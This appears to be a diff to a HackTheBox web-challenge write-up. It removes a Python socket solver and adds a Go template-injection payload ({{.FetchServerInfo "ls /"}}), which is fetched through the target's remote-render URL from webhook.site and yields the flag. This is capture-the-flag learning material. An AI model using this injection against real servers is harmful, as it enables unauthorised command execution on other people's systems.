@@ -9,50 +9,14 @@ tags: [write-up, hackthebox, challenge, web]
 * TOC
 {:toc}
 
+Create webhook with content.
 ```text
-import socket 
-import re   
+{{.FetchServerInfo "ls /"}}
+```
 
+Get flag:
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("206.189.24.162",30351))
-
-def check(calc, regex):
-    while re.findall(regex, calc):
-        found= re.findall(regex, calc)[0]
-        print(found)
-        calc = calc.replace(found, str(eval(found)),1)
-        print(calc)
-    return calc
-
-
-def calculate(line):
-    while len(re.findall(r"[0-9]{1,99}",line))>1:
-        if(re.findall(r"\([0-9*+ ]*\)",line)):
-            nextline=re.findall(r"\([0-9*+ ]*\)",line)[0]
-            print(nextline)
-            line = line.replace(nextline,calculate(nextline[1:-1])) 
-            print(line)
-        else:
-            while len(re.findall(r"[0-9]{1,99}",line))>1:
-                line=check(line, r"[0-9]{1,99} \+ [0-9]{1,99}")
-                line=check(line, r"[0-9]{1,99} \* [0-9]{1,99}")
-    return line
-
-
-
-
-for line in range(500):
-    print(f"{line+1}/500")
-    reply = str(s.recv(4096))
-    calc = re.findall(r"]: (.+)? =",reply)[0]
-    calc = calculate(calc)
-    result=eval(calc)
-    s.sendall(bytes(f"{result}\n","utf-8"))
-
-
-
-flag = str(s.recv(4096))
-
-print(flag)
+```text
+http://209.97.140.29:30692/render?use_remote=true&page=https://webhook.site/362e5709-55f9-4601-9405-dbc508679808
+HTB{qu35t_f0r_th3_f0rb1dd3n_t3mpl4t35!!}
 ```
